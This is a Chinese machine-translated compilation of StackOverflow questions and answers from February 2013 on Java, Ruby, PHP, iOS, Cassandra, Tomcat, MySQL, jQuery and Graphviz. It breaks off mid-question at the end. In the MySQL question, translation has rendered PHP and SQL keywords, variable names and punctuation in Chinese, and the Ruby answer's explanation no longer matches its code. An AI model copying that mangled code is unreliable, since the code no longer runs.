# StackOverflow 问答 15110000-15110999

# java - 通过应用约束来验证 zk 中的电子邮件

> ID：15110004
> 
> 赞同：-3
> 
> 时间：2013-02-27T10:41:58.177
> 
> 标签：java, zk

我对电子邮件应用了以下约束

```
<textbox width="400px"
constraint="/^[A-Za-z0-9_\-\.]+@[A-Za-z0-9_\-\.]{2,}\.[A-Za-z0-9]{2,}(\.[A-Za-z0-9])?/: Please enter an e-mail address in proper format" > 
```

在 ZK 中，即使文本框为空白并且您单击文本框，这也会显示错误。但我只想在用户在文本框中输入一些值时验证。

您能否建议，我如何根据我的要求修改此约束。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T12:04:00.230

到目前为止，约束似乎是正确的。您应该使用[表单绑定](http://books.zkoss.org/wiki/ZK%20Developer%27s%20Reference/MVVM/Data%20Binding/Form%20Binding "表单绑定")来拥有一个中间模型，它甚至可以保存无效数据。然后在将中间数据保存到“真实”模型之前强制执行约束。

编辑：

这不匹配**任何内容**或**电子邮件**。

`constraint="/^(?:([A-Za-z0-9_\-\.]+@[A-Za-z0-9_\-\.]{2,}\.[A-Za-z0-9]{2,}(\.[A-Za-z0-9])))?/: Please enter an e-mail address in proper format"`

# ruby - 如何使用 Ruby 脚本打开多个 Excel 文件？

> ID：15110006
> 
> 赞同：-1
> 
> 时间：2013-02-27T10:41:59.347
> 
> 标签：ruby, excel, parsing

我正在编写一个 ruby​​ 脚本来遍历包含要在*Microsoft Excel*中打开的文件路径列表的文件。我读了这样的文件：

```
file_names = IO.readlines('D:\TEST_1\file_names.txt') 
```

接下来，我从解析文件的每一行创建一个文件名数组（因此包含一个文件路径数组）。最后，我使用以下代码遍历该数组，以打开文档：

```
require 'win32ole'
xl = WIN32OLE.new('Excel.Application')
xl.Visible = 1
file_names.each do |file_name|
wb1=xl.Workbooks.Open(file_name)
ws1=wb1.worksheets(1)
end 
```

第一次调用 parse`file_names.txt`产生了这个异常，我很难理解：

> Test4.rb:6:in 'method_missing' OLE 错误代码：800A03EC 在 Microsoft Office Excel 'D:\Test_1\1.xlsx' 中找不到。检查文件名的拼写，并验证文件位置是否正确。
> 
> 如果您尝试从最近使用的文件列表中打开文件，请确保该文件未被重命名、移动或删除 HR 错误代码：0x80020009 发生异常。来自 Test4.rb:6:in 'block in' from Test4.rb:5:in 'each' from Test4.rb:5:in ''

当我将单个文件名（而不是文件路径）作为参数传递时，不会出现此错误 - 那么为什么我会在这里得到它？任何帮助将非常感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T11:00:07.470

乍一看，您使用的不是变量“file_name”，而是一个符号：file_name。

```
file_array.each do |file_name|
  wb1=xl.Workbooks.Open(file_name)
  ws1=wb1.worksheets(1)
end 
```

# php - Google API PHP 客户端无法获取联系人

> ID：15110007
> 
> 赞同：1
> 
> 时间：2013-02-27T10:41:59.443
> 
> 标签：php, google-api, google-api-php-client

我使用了这个[https://code.google.com/p/google-api-php-client/source/browse/trunk/examples/contacts/simple.php](https://code.google.com/p/google-api-php-client/source/browse/trunk/examples/contacts/simple.php)的第 49 行到第 54 行的代码 但是，我得到了invalid_grant 错误。我去了谷歌 API 控制台，我无法提交谷歌联系人服务来授予。

请帮我。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-13T16:29:32.703

您是否在以下几行中包含了正确的设置？您需要在[API 控制台](https://code.google.com/apis/console#access)中创建应用程序设置，然后将这些设置插入到您下面的代码中。一旦所有设置都正确，这段代码对我来说非常完美。

```
$client = new Google_Client();
$client->setApplicationName('Google Contacts PHP Sample');
$client->setScopes("http://www.google.com/m8/feeds/");
// Documentation: http://code.google.com/apis/gdata/docs/2.0/basics.html
// Visit https://code.google.com/apis/console?api=contacts to generate your
// oauth2_client_id, oauth2_client_secret, and register your oauth2_redirect_uri.
// $client->setClientId('insert_your_oauth2_client_id');
// $client->setClientSecret('insert_your_oauth2_client_secret');
// $client->setRedirectUri('insert_your_redirect_uri');
// $client->setDeveloperKey('insert_your_developer_key'); 
```

# iphone - 在 iphone 5 中重新调整 TabelView 的大小

> ID：15110010
> 
> 赞同：0
> 
> 时间：2013-02-27T10:42:03.980
> 
> 标签：iphone, ios, ios6

我正在使用 Autosizing 蒙版，`UITableView`因此它在 iPhone 5 上也能正常工作，但我在那个控制器中做了一些帧动画，所以它会`UITableView`自动降低它的高度。无法理解出了什么问题。我也以编程方式进行了自动调整掩码，但不起作用。我被困在这里了……！

非常感谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T10:55:38.430

试试这个代码..

```
self.tblRoomList.autoresizesSubviews = YES;
self.tblRoomList.autoresizingMask = UIViewAutoresizingFlexibleHeight | UIViewAutoresizingFlexibleWidth|UIViewAutoresizingFlexibleLeftMargin|UIViewAutoresizingFlexibleTopMargin|UIViewAutoresizingFlexibleRightMargin|UIViewAutoresizingFlexibleBottomMargin; 
```

或者这样做

![或者在xib中这样做](../Images/6c42df48b9296e7fe91286cd7246df4f.png)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T10:48:41.423

如果表格底部有标签栏底部工具栏，则不应在自动调整掩码中使用**UIViewAutoresizingFlexibleBottomMargin 。**

# iphone - 将保留对象分配给弱属性；分配后对象将被释放

> ID：15110017
> 
> 赞同：14
> 
> 时间：2013-02-27T10:42:23.730
> 
> 标签：iphone, ios

* * *

## 回答 #1

> 赞同：30
> 
> 时间：2013-02-27T10:48:05.237

我想你的`containerView`财产是用`weak`属性声明的。如果您想拥有某个`weak`属性的属性，那么应该已经有人保留了它。这是一个例子：

```
@property (nonatomic, weak) KGModalContainerView *containerView;
...
-(void)viewDidLoad {
    [super viewDidLoad];
    KGModalContainerView *myContainerView = [[KGModalContainerView alloc] initWithFrame:containerViewRect]; // This is a strong reference to that view
    [self.view addSubview:myContainerView]; //Here self.view retains myContainerView
    self.containerView = myContainerView; // Now self.containerView has weak reference to that view, but if your self.view removes this view, self.containerView will automatically go to nil.

 // In the end ARC will release myContainerView, but it's retained by self.view and weak referenced by self.containerView
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2015-02-06T00:53:59.060

我作为 Objective C 初学者的 2 美分：

给出警告的行的右侧，

```
[[KGModalContainerView alloc] initWithFrame:containerViewRect] 
```

在堆中创建一个对象，此时该对象没有被任何指针引用。然后将此对象分配给`self.containerView`。因为`self.myContainerView`是弱的，所以赋值不会增加右侧创建的对象的引用计数。所以当赋值完成后，对象的引用计数还是0，因此ARC会立即释放对象。

# forms - Spring MVC 使用 form:radiobuttons 绑定数据（整个对象不只有一个值）

> ID：15110018
> 
> 赞同：2
> 
> 时间：2013-02-27T10:42:24.113
> 
> 标签：forms, jsp, spring-mvc, radio-button

我在使用构造从我的 JSP 通过 POST 向后端发送数据时遇到问题：

```
<form:radiobuttons path="pvClCategory" items="${categoryList}" itemLabel="clcaCategory"/> 
```

提交后，我的 Jboss（版本 5）显示：

```
HTTP Status 400 - description: The request sent by the client was syntactically incorrect (). 
```

我不知道如何查看已发送的请求。当我在下面使用构造时，一切正常，但我不想只绑定对象中的一个值，而是绑定整个对象：

```
<form:radiobuttons path="pvClCategory.clcaCategory" items="${categoryList}" itemValue="clcaCategory" itemLabel="clcaCategory"/> 
```

所以，第一个表单构造（绑定整个对象）给我带来了一个问题。表单已正确初始化，这意味着单选选项已正确显示，并且在 jsp 站点上选择了正确的值。但是当我想提交表单时出现问题，我收到错误（客户端发送的 HTTP 状态 400 请求在语法上不正确）。知道为什么吗？我做错了什么？

* * *

## 我的代码：

我有一个实体类 Violation 字段名为 pvClCategory 类型为 ClCategory

```
@Entity
@Table(name="PV_VIOLATIONS")
public class Violation implements Serializable {
    private static final long serialVersionUID = 1L;

    @Id
    @GeneratedValue(strategy=GenerationType.AUTO)
    @Column(name="VIOL_ID")
    private Long id;

    @ManyToOne
    @JoinColumn(name="VIOL_CLCA_ID")
    private ClCategory pvClCategory;

    /* others fields and getters/setters */
} 
```

我的 ClCategory 实体类需要将其绑定到 Violation.pvClCategory 字段：

```
@Entity
@Table(name="PV_CL_CATEGORIES")
@Cache(usage=CacheConcurrencyStrategy.READ_ONLY)
public class ClCategory implements Serializable {
    private static final long serialVersionUID = 1L;

    @Id
    @GeneratedValue(strategy=GenerationType.AUTO)
    @Column(name="CLCA_ID")
    private long clcaId;

    @Column(name="CLCA_CATEGORY")
    private String clcaCategory;

    @OneToMany(mappedBy="pvClCategory")
    private List<Violation> pvViolations;

    public ClCategory() {
    }

    public long getClcaId() {
        return this.clcaId;
    }

    public void setClcaId(long clcaId) {
        this.clcaId = clcaId;
    }

    public String getClcaCategory() {
        return this.clcaCategory;
    }

    public void setClcaCategory(String clcaCategory) {
        this.clcaCategory = clcaCategory;
    }

    public List<Violation> getPvViolations() {
        return this.pvViolations;
    }

    public void setPvViolations(List<Violation> pvViolations) {
        this.pvViolations = pvViolations;
    }

    @Override
    public int hashCode() {
        final int prime = 31;
        int result = 1;
        result = prime * result + (int) (clcaId ^ (clcaId >>> 32));
        return result;
    }

    @Override
    public boolean equals(Object obj) {
        if (this == obj)
            return true;
        if (obj == null)
            return false;
        if (getClass() != obj.getClass())
            return false;
        ClCategory other = (ClCategory) obj;
        if (clcaId != other.clcaId)
            return false;
        return true;
    }
} 
```

这个 Violation 类在我的表单中的 commandName 属性中使用如下（文件名：v.jsp）：

```
<form:form action="../update" method="post" commandName="violation">
    <form:radiobuttons path="pvClCategory" items="${categoryList}" itemLabel="clcaCategory"/>
    <!-- other fields -->
    <button type="submit" value="Apply Changes" class="button-default" >Apply</button>
</form:form> 
```

我的控制器：

```
@Controller
@RequestMapping("/viol")
public class ViolationController {

    @RequestMapping("edit/{violationId}")
    public String edit(@PathVariable("violationId") long id, Map<String, Object> map) {
        Violation violation = violationService.getViolation(id);

        map.put("violation",violation);
        map.put("categoryList", adminService.listCategories());

        return "v";
    } 
} 
```

正如我在构造**表单中所理解的那样：radiobuttons path="" items=""**路径是数据绑定的属性，因此项目中交付列表中的整个对象应该绑定到它。我输入了我的类别的项目列表，这些类别是 ClCategory 类型的对象。提交后出现错误。

当我使用**form:radiobuttons path="pvClCategory.clcaCategory" items="${categoryList}" itemValue="clcaCategory" itemLabel="clcaCategory"**仅绑定来自项目中对象的字符串值（在这两种情况下都使用相同的对象列表ClCategory 类型），则表单已正确提交，但我不想只绑定 objecte 的一个值，而是绑定整个对象。你能帮我做错什么吗？

# php - 我们可以使用 javascriopt 检索和设置 PHP cookie

> ID：15110020
> 
> 赞同：2
> 
> 时间：2013-02-27T10:42:28.753
> 
> 标签：php, javascript, redirect, cookies

我已经使用 PHP 设置了一个 cookie，

```
setcookie("redirect", $this->currentPage(), time() + 31536000); 
```

但是我想在单击某个链接时使用 javascript 检索此 cookie 的值。我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-27T10:46:38.337

是的，有可能。

试试这个来读取cookie：

```
function getCookie(c_name) {
    var i,x,y,ARRcookies=document.cookie.split(";");
    for (i=0;i<ARRcookies.length;i++) {
       x=ARRcookies[i].substr(0,ARRcookies[i].indexOf("="));
       y=ARRcookies[i].substr(ARRcookies[i].indexOf("=")+1);
       x=x.replace(/^\s+|\s+$/g,"");
       if (x==c_name){
         return unescape(y);
       }
    }
 }

// get cookie foo
var foo = getCookie('foo'); 
```

试试这个来设置一个cookie：

```
/**
 * Sets a cookie
 */
function setCookie(c_name,value,exdays) {
    var exdate=new Date();
    exdate.setDate(exdate.getDate() + exdays);
    var c_value=escape(value) + ((exdays==null) ? "" : "; expires="+exdate.toUTCString());
   document.cookie=c_name + "=" + c_value;
}

// set a cookie 'foo=bar' for 3 days
setCookie('foo', 'bar', 3); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-02-27T10:47:42.700

Cookie 不是特定于 PHP 的，它们是特定于浏览器的，可以通过 PHP 和 Javascript 放置。对于一个简单的解决方案，您可以查看[jQuery 的 Cookie 插件](https://github.com/carhartl/jquery-cookie)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-06-09T00:55:44.280

这是另一种尝试更容易理解的方法。

此外，由于 cookie 是经过编码的（键和值），因此您需要对它们都进行解码。

```
var getCookie = function(name) {

    var thisCookie,
        keyValuePair,
        key,
        value,
        cookies = document.cookie.split('; ') ;

    for ( var i=0 ; i<cookies.length ; i++ ) {
        thisCookie = cookies[i] ; 
        keyValuePair = thisCookie.split('=') ; 
        key = decodeURIComponent(keyValuePair[0]) ; 
        if ( key === name ) { 
            value = keyValuePair[1] ; 
            return (value != null) ? decodeURIComponent(value) : null;
        }
    }
} 
```

关于在单击链接时获取 cookie 的部分，您将在事件处理程序中调用此函数。

假设您知道如何在 JavaScript 中获取相关链接。这是获取文档中第一个链接的一种方法：

```
var link = document.querySelector('A') ; 
```

无论如何，一旦你有了你的链接，点击链接时如何获取值：

```
var getCookieOnLinkClick = function() {
    var cookieValue = getCookie('cookieName') ;
    console.log('Cookie value is ', cookieValue) ; 
} 

link.addEventListener('click', getCookieOnLinkClick) ; 
```

（当然，大多数链接都会加载一个新页面，因此一旦获得 cookie 值，您将没有太多时间对它进行任何操作。）

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2017-06-09T03:40:23.047

错误的概念。Cookie 存储在浏览器中。PHP 通过 HTTP 请求和响应获取/设置浏览器 cookie。所以 PHP 和浏览器 JS 都可以操作相同的 cookie。

# javascript - jQuery 代替 Flash 动画

> ID：15110025
> 
> 赞同：0
> 
> 时间：2013-02-27T10:42:33.747
> 
> 标签：javascript, jquery, html, css, flash

[我正在尝试找到一种方法来将此页面http://www.autopulsen.se/](http://www.autopulsen.se/)上的 flash 动画替换为 jQuery。我可以剪切图像并使用 javascript 旋转它们，但这需要对代码进行重大更改。基本上我想在没有闪光灯的情况下保持相同的外观。

这可能吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T10:46:59.473

是的你可以。

你的出发点是看看[这个网站](http://www.tripwiremagazine.com/2012/12/jquery-image-zoom.html)，那里有很多缩放插件，这是那个 flash 菜单的主要特点。然后你会想要链接[JQuery Shake](http://docs.jquery.com/UI/Effects/Shake)效果，也许看看[淡入淡出](http://docs.jquery.com/UI/Effects/Fade)效果。

[为了获得倾斜的外观，您需要使用这里](http://www.css3files.com/transform/#skew)的 skew css 选择器。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-27T15:37:52.463

我将投入 GreenSock 动画平台：

[www.greensock.com/gsap-js](http://www.greensock.com/gsap-js)

这可能值得一看，特别是如果可以选择支付商业许可证，因为其中包括一个非常漂亮的 throwProps 插件。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-27T10:50:06.983

你可以使用 CSS3 动画，但我认为这个很好，而且很难内置在 CSS3 中，反正给你一些动画生成器

*   [停止者](http://matthewlein.com/ceaser/)
*   [CSS3动画生成器](http://www.css3animationgenerator.com/)
*   [Css3Maker](http://www.css3maker.com/css3-animation.html)

而这个是为了灵感

*   [在 DesignShack](http://designshack.net/articles/css/10-amazing-examples-of-innovative-css3-animation/)

# cassandra - 在 Cassandra 中处理以下用例？

> ID：15110028
> 
> 赞同：0
> 
> 时间：2013-02-27T10:42:38.193
> 
> 标签：cassandra

我的任务是在 Cassandra 中简单地建模。不过，我几乎完全来自 SQL 背景，但在弄清楚它时遇到了一些麻烦。

基本上，我们有一个订阅列表，我们会定期收听该更新。这可以是 RSS、JSON、ATOM、XML 等（取决于提要）。

我们要做的是定期检查每个提要中的新项目，将数据转换为几种格式（即 JSON 和 RSS）并将其存储在 Cassandra 存储中。

因此，在 RBDMS 中，结构类似于：

```
Feed:
feedId
name
URL

FeedItem:
feedItemId
feedId
title
json
rss
created_time 
```

我很困惑如何在 Cassandra 中对数据进行建模以促进简单的事情，例如按创建的降序获取特定提要的 x 数量的项目（这可能是最常见的查询）。

我听说过一种策略提到有一个复合键存储，在这个例子中，created_time 作为一个基于时间的 UUID 和提要项 ID，但我仍然有点困惑。

例如，假设我有一系列行，其键基本上是 feedId。在每一行中，我存储了上面提到的一系列列。问题是，实际数据到哪里去了（即 JSON、RSS、标题）？我是否必须将该“记录”的所有数据存储为列值？

我想我混淆了宽行和窄（短？）行，因为我喜欢复合键的想法，但我也想在每条记录中存储其他数据，我不知道如何将两者融合在一起......

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-03T22:02:51.020

您可以将所有内容存储在一个列族中。但是，如果每个 FeedItem 的数据非常大，您可以将每个 FeedItem 的数据拆分为另一个列族。

例如，Feed 可以有 1 个列族，该键的列是 FeedItem id，类似于，

```
Feeds  # column family
   FeedId1  #key
      time-stamp-1-feed-item-id1   #columns have no value, or values are enough info
      time-stamp-2-feed-item-id2   #to show summary info in a results list 
```

Feeds 列可让您快速获取 Feed 的最后 N 项，但查询 Feed 的最后 N 项不需要获取每个 FeedItem 的所有数据，要么不获取任何数据，要么仅获取摘要。

然后你可以使用另一个列族来存储实际的 FeedItem 数据，

```
FeedItems # column family 
    feed-item-id1 # key
        rss   # 1 column for each field of a FeedItem
        title # 
        ... 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-06T11:28:48.850

根据您的 SQL 背景，使用 CQL 应该更容易理解。

Cassandra（和一般的 NoSQL）速度非常快，使用相关表作为提要并没有真正的好处，而且无论如何您将无法进行 JOIN。显然，如果您愿意的话，您仍然可以创建两个表，但是您必须在应用程序代码中管理链接数据。

你可以使用类似的东西：

```
CREATE TABLE FeedItem (
  feedItemId ascii PRIMARY KEY,
  feedId ascii,
  feedName ascii,
  feedURL ascii,
  title ascii,
  json ascii,
  rss ascii,
  created_time ascii ); 
```

在这里，我对所有内容都使用了 ascii 字段。您可以选择对 feedItemId 或 created_time 使用不同的数据类型，可用的数据类型可以在[此处](http://www.datastax.com/docs/1.1/references/cql/cql_data_types)找到，并且根据您使用的语言和客户端，它可以是透明的，也可以需要更多的工作才能使其正常工作。

您可能想要添加一些二级索引。例如，如果您想从特定的 feedId 中搜索 feed 项目，例如：

```
SELECT * FROM FeedItem where feedId = '123'; 
```

创建索引：

```
CREATE INDEX FeedItem_feedId ON FeedItem (feedId); 
```

排序/排序，唉，这在 Cassandra 中并不容易。也许[在这里](http://ayogo.com/blog/sorting-in-cassandra/)和[这里](http://brianoneill.blogspot.it/2012/03/cassandra-indexing-good-bad-and-ugly.html)阅读可以为您提供一些从哪里开始寻找的线索，而且这实际上取决于您要使用的 cassandra 版本。

# java - 使用 Tomcat 配置集群和负载平衡的步骤？

> ID：15110030
> 
> 赞同：0
> 
> 时间：2013-02-27T10:42:57.320
> 
> 标签：java, tomcat, web-applications, cluster-computing, load-balancing

**我最近了解了集群**和**负载平衡**之间的区别。

我有一个聊天应用程序，我需要它来测试负载平衡和集群。

我google了很多，无法得到确切的答案。

我不知道如何用tomcat进行配置。

希望我们的 Stack 用户能给出最好的答案，并为我提供配置步骤和所需的服务器和文件。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T14:12:31.090

Tomcat 集群通常意味着会话复制——当您有一个部署在两台服务器上的聊天应用程序时，这可能不是您所期望的。恐怕，我希望您必须明确编写一些业务层代码才能让用户 1 连接到 tomcat 1，并能够在 tomcat 2 上与用户 2 聊天。

将 tomcat配置[为集群](http://tomcat.apache.org/tomcat-7.0-doc/cluster-howto.html)将帮助您的负载均衡器在 tomcat 1 失败的情况下平衡从 tomcat 1 到 tomcat 2 的请求（通常用户在 tomcat 集群安装中继续登录）。但它不会帮助您的聊天神奇地分布在两台服务器之间。

我怀疑这就是让您感到困惑的原因 - 与您正在寻找的东西相比，它似乎有所不同。（我只是根据您提供的一点信息来猜测）

恐怕，我不希望任何人提供能够神奇地工作的配置文件（或者我误解了你的问题）

# c++ - 如何获得“硬件时间”

> ID：15110033
> 
> 赞同：0
> 
> 时间：2013-02-27T10:43:01.533
> 
> 标签：c++, windows, time

我正在尝试创建一个将许可证有效时间与计算机时间进行比较的许可证系统。我想直接从“硬件”获取时间，这样就不可能通过更改操作系统（Windows）时间来欺骗许可证系统。

我试过谷歌搜索，但也许我不知道正确的关键字。我检查过的不同时间 API 没有明确说明它们是否依赖于操作系统。

你会使用什么 API 来解决这个问题？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-27T10:53:11.677

没有什么可以阻止用户更改硬件 (BIOS) 时间。所以，如果你想依赖硬件，你也可以信任 Windows 系统时间。

一种方法是咨询 NTP 时间服务器。但要确定的是，您必须设置或使用一个 NTP 服务器，它会自我验证。

有关更多信息，请参阅[NTP 常见问题验证](http://www.ntp.org/ntpfaq/NTP-s-config-adv.htm#S-CONFIG-ADV-AUTH)。

但也要记住，这只有在有网络连接的情况下才有效。如果用户拔掉网线或关闭路由器，这种方法就会失效。

# mysql - 从请愿书中获取用户 ID 并插入到其他表中

> ID：15110034
> 
> 赞同：0
> 
> 时间：2013-02-27T10:43:01.720
> 
> 标签：mysql, database

帮助我如何从此表中获取用户 ID，例如请愿书 ID = 52，然后如果获取我想要插入到 SYSTEMID 中的第二个表（auto_increment）的所有用户 ID

这是我的命令：

```
$result = $db->Execute("选择请愿 ID,MT4ACCOUNTID, phpfox_petition_text.petition_goal,user_id " . "来自 phpfox_petition_text,phpfox_tradeusers " . "其中 phpfox_petition_text.petition_goal = $mt4acctid 和 user_id=$systemid ");
        $symbol1 = $result->fields[0];
        $symbol14 = $result->字段[3];

$result212 = $db->Execute("SELECT request_id, user_id " . "from phpfox_petition_sign " . "其中请愿 ID=".$symbol1." and MT4ACCOUNTID=$mt4acctid ORDER BY time_stamp DESC");
  $symbol122 = $result212->字段[1];

  $result111 = $db->Execute("SELECT full_name " . "from phpfox_user " . "where user_id=$systemid ");
        $symbol1user = $result111->fields[0];

        $记录 = 数组（）；
        $记录[“符号”] = $符号；
        $record["CMD"] = $cmd;
        $record["VOLUME"] = $volume;
        $记录[“价格”] = $价格；
        $record["SLIPPAGE"] = $slippage;
        $record["STOPLOSS"] = $stoploss;
        $record["TAKEPROFIT"] = $takeprofit;
        $record["COMMENT"] = 'MyfaceFx>复制自 ::'.$symbol1user;
        $记录[“魔法”] = $魔法；
        $record["EXPIRATION"] = $expiration;
        $record["MT4SIGNALID"] = $signalid;
        $record["BROKERNAME"] = $brokername;
        $record["MT4ACCTID"] = $mt4acctid;
        $record["TIMESTAMP"] = time();
        $record["SYSTEMID"] =$symbol122;
        $record["ORDERUNITS"] = $basecurrencyunits;
        $record["ACCTBALANCE"] = $acctbalance;
        $record["ACCTCURRENCY"] = $acctcurrency;

    $insertSQL = $db->AutoExecute('phpfox_tradesignals', $record, 'INSERT');
    $insertsignalid = $db->Insert_ID();

```

它的工作，但只得到1这样的结果：

```
   过期：systemid       
    ..................................................... ......

              : 27

```

但我想得到这样的结果：

```
   过期：systemid       
    ..................................................... ......

              : 27

              : 29

              : 26

              : 34
 ETC....

```

表请愿

```
   请愿ID：用户ID        
    ..................................................... ......
    50 : 35   
    52 : 27
    40 : 23  
    52 : 29
    50 : 35   
    52 : 26
    40 : 23  
    52 : 34
   ETC....

```

表 SYSTEMID

```
   过期：systemid       
    ..................................................... ......

```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T11:22:27.607

因此，如果您想将一个表中的值插入到另一个表中：

```
INSERT INTO table2 (systemid)
SELECT user_id
FROM   table1
WHERE  petition_id = 52 
```

# text - Kendo UI Grid 禁用拖动行选择

> ID：15110035
> 
> 赞同：5
> 
> 时间：2013-02-27T10:43:03.837
> 
> 标签：text, grid, kendo-ui, drag

目前我有一个带有多行可选的剑道网格。我的问题是由于 Kendo 的拖动行选择功能，我无法从任何列中选择文本。有什么方法可以禁用 Kendo Grid 中的拖动行选择？

非常感谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2015-10-26T22:03:46.860

我知道这是一个老问题，但我能找到的关于这个问题的最佳答案已经[在 Telerik 论坛上结束了](http://www.telerik.com/forums/multiselect-grid-deactivate-mouse-selection)

我改编了一个角度版本的解决方案，它另外调用了网格更改回调。

```
.directive('kendoGrid', ['$', '$parse',
  function($parse) {
    return {
      link: function(scope, element, attrs) {
        if (attrs.multiselect !== undefined) {
          attrs.kSelectable = '""';
          var selectedClass = 'k-state-selected';
          var fn = $parse(attrs.kOnChange);
          $(element).delegate('tbody tr', 'click', function(e) {
            e.preventDefault();
            if (e.ctrlKey || e.metaKey) {
              $(this).toggleClass(selectedClass);
            } else {
              $(this).addClass(selectedClass).siblings().removeClass(selectedClass);
            }
            var grid = $(element).data('kendoGrid');
            if (fn) {
              scope.$apply(function() {
                fn(scope, {
                  kendoEvent: {
                    sender: grid
                  }
                });
              });
            }
          });
          scope.$on(
            '$destroy',
            function() {
              $(element).undelegate('tbody tr', 'click');
            }
          );
        }
      }
    };
  }
]) 
```

根据论坛上的评论，传统的 grid.select() 调用不再起作用，因为它需要一个选择模型。

```
var grid = kendoEvent.sender;
var selectedRows = grid.tbody.find(".k-state-selected"); //grid.select(); 
```

# tcp - AWS EC2：通过端口 443 进行 ssh，尽管实例上安装了 apache

> ID：15110039
> 
> 赞同：0
> 
> 时间：2013-02-27T10:43:09.093
> 
> 标签：tcp, ssh, amazon-web-services, amazon-ec2, ip

我希望能够从工作中 ssh 进入我的实例，但我正在使用公司防火墙并且端口 22 已关闭。昨天我更改了 ssh 配置文件并将 22 端口替换为 80 端口，但随后一切都崩溃了（无法再通过 ssh 进入实例），因为 apache 已安装并且已经使用了 80 端口。那么 443 端口呢？我在这个实例上没有使用 https，我可以用它来连接 ssh，但它会触发同样的问题吗？

另一个问题：它会干扰我一直用来检索网页的 curl 吗？

Ps：对于那些有兴趣的人，这是我昨天解决问题的方法

1.  停止实例，分离 EBS 卷
2.  将卷（不作为根驱动器）附加并安装到另一个实例
3.  连接到另一个实例并使用 vi 编辑器使用端口 22 重新建立配置文件
4.  分离卷，将其重新附加为旧实例上的根驱动器，重新启动：瞧

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T17:06:38.377

如果 Apache 不使用 443 端口，那么不，不会有问题。

如果 Apache 使用端口 443，那么是的，这将是一个问题。但是您可以将 Apache 重新配置为不使用端口 443。

假设您的实例正在运行 Linux/BSD，请运行`netstat -ltn`以找出正在侦听的 tcp 端口。

它不会干扰 curl：curl 不听；它是客户端而不是服务器。

# jquery - 不想重复自己

> ID：15110040
> 
> 赞同：0
> 
> 时间：2013-02-27T10:43:11.387
> 
> 标签：jquery

我有一些链接，当有人单击这些链接时，它会显示一个包含一些信息的弹出窗口。然后当用户单击 x 时关闭它我使用了 jquery 的显示和隐藏来执行此操作。不同的链接有不同的信息，所以我重复了自己，我想知道有什么办法不重复自己。[这个链接](http://jsbin.com/ovomaw/1/edit)将带你到我的代码所在的 jsbin，你明白我在说什么。谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T10:52:47.353

如果你给 div 你试图显示一个 id 和你点击同一个类的链接和一个 div id 的 href （这也使它更容易访问），你可以做这样的事情：

[http://jsfiddle.net/GE6fX/1/](http://jsfiddle.net/GE6fX/1/)

**html**

```
<a class="show" href="#zerotwo">link1</a>
<div id="zerotwo">
   <h1>Link heading <span>[close x]</span></h1>
   <p>blah</p>
</div>
<a class="show" href="#zerothree">link2</a>
<div id="zerothree">
   <h1>Link heading <span>[close x]</span></h1>
   <p>blah</p>
</div> 
```

**js**

```
$('.show').click(function() {
    var showDiv = $($(this).attr('href'));
    showDiv.show();
    showDiv.find('h1 span').click(function() {
        showDiv.hide();
    });
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-27T10:59:24.977

您需要以某种方式从链接传递要显示的 div 的类，这是使用`data-`属性的一种方式。如果页面上只有一个 div，它应该是一个 id。

我已将您的链接更改为具有相同的“显示”类（可以更好地命名），弹出按钮我给了一个类`closepopup`，并且您的弹出窗口有一类`popup`单击关闭一个将隐藏所有显示的弹出窗口（这可能不是期望的行为）

html

```
<body>
  <a class="show" data-popupid="zerotwo" href="#">link1</a>
  <a class="show" data-popupid="zerothree" href="#">link2</a>
    <div id="zerotwo" class="popup">
      <h1>Link heading <span class='closepopup'>[close x]</span></h1>
      <p>dhakshdakdhkhdahdlldhalksh</p>
    </div>
    <div id="zerothree" class="popup">
      <h1>Project completion report submission <span class='closepopup'>[close x]</span></h1>
       <p>dhakshdakdhkhdahdlldhalksh</p>
    </div>                    
</body> 
```

JS

```
$(document).ready(function() {
  $('.show').click(function() {
    var popupClass = $(this).data('popupid');
    $('div#' + popupClass).show();
  });
  $('.closepopup').click(function() {
    $('div.popup').hide();
  });
}); 
```

`div`您可以通过在页面上设置一个并控制单击的任何链接的内容或弹出类型，然后在 JS 中动态添加弹出内容的内容来使这一点更整洁。

这个有很多解决方案，具体取决于您的要求。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-27T10:57:55.077

您可以在这里以多种方式清理它，我只使用一个弹出 div，而是在每次点击时设置其内容。

[http://jsbin.com/ovomaw/2/edit](http://jsbin.com/ovomaw/2/edit)

或者您可以使用某种模板库为每个弹出窗口添加 html 到您的文档中（这将允许您一次看到多个弹出窗口）。

如果不了解您的数据来自何处等，很难确定正确的解决方案

# graphviz - Graphviz 点语言 - 绘制单个断开连接的节点/顶点？

> ID：15110044
> 
> 赞同：5
> 
> 时间：2013-02-27T10:43:16.973
> 
> 标签：graphviz

我已经在谷歌上搜索了很长一段时间，但我找不到任何东西。如何使用 Graphviz 绘制没有顶点连接的图形？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-02-27T11:01:22.447

像这样：

```
digraph g {
  SingleNode;
} 
```

简单地**不**定义将节点连接到其他节点的任何边 ( `SingleNode -> OtherNode`)。

# asp.net - Html 按钮在 Google Chrome 中触发两个回发

> ID：15110049
> 
